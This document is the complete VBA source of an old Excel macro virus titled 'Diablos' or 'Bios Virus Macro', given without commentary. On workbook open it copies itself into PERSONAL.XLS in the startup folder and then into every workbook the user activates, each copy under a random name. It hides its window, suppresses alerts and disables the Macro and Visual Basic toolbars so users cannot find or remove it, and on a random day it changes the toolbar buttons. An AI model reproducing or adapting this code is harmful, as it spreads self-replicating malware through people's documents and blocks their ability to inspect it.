   Attribute VB_Name = "C342"
   ' Diablos Macro
   ' Bios Virus Macro - (C) Copyright 1999/2000

   Public Macro As String

   Sub auto_open()
   Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
       On Error GoTo ErrorHandler
       MkDir (Application.StartupPath)
       On Error GoTo 0
       GoTo ErrorHandler
   ErrorHandler:
   For i = 1 To ThisWorkbook.VBProject.VBComponents.Count
       Cadena = ThisWorkbook.VBProject.VBComponents(i).Name
       Letras = Left(Cadena, 1): Numero = Right(Cadena, 3)
       If Letras = "C" And Numeros <= "1000" Then
          Macro = ThisWorkbook.VBProject.VBComponents(i).Name
       End If
   Next
   Application.OnSheetActivate = "Modulo"
   End Sub

   Sub Modulo()
   Attribute Modulo.VB_ProcData.VB_Invoke_Func = " \n14"
       Randomize
       Application.ScreenUpdating = False
       Application.DisplayAlerts = False
       Set Bar1 = CommandBars("Macro")
           Bar1.Enabled = False
       Set Bar2 = CommandBars("Visual Basic")
           Bar2.Enabled = False
       install = 0
       Intr = Int((Rnd * 1000) + 1)
       Play = ("C" & Intr)
       If ThisWorkbook.Name <> "PERSONAL.XLS" Then
          If Dir(Application.StartupPath + "\PERSONAL.XLS") = "PERSONAL.XLS" Then install = 1
          If install = 0 Then
             Workbooks.Add.SaveAs FileName:=Application.StartupPath + "\PERSONAL.XLS"
             ThisWorkbook.VBProject.VBComponents(Macro).Export (Macro)
             Workbooks("PERSONAL.XLS").VBProject.VBComponents.Import (Macro)
             Workbooks("PERSONAL.XLS").VBProject.VBComponents(Macro).Name = Play
             Workbooks("PERSONAL.XLS").Save
             Windows("PERSONAL.XLS").Visible = False
          End If
       Else
          Windows("PERSONAL.XLS").Visible = False
          For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
              Cadena = ActiveWorkbook.VBProject.VBComponents(i).Name
              Letras = Left(Cadena, 1): Numero = Right(Cadena, 3)
              If Letras = "C" And Numeros <= "1000" Then install = 1
          Next
          If install = 0 Then
             Workbooks("PERSONAL.XLS").VBProject.VBComponents(Macro).Export (Macro)
             ActiveWorkbook.VBProject.VBComponents.Import (Macro)
             ActiveWorkbook.VBProject.VBComponents(Macro).Name = Play
             Workbooks(ActiveWorkbook.Name).Save
             Windows("PERSONAL.XLS").Visible = False
          End If
       End If
       Workbooks("PERSONAL.XLS").Save
       Application.ScreenUpdating = True
       Application.DisplayAlerts = True
       If Day(Now()) = Int((31 * Rnd) + 1) Then CommandBars.LargeButtons = True
   End Sub
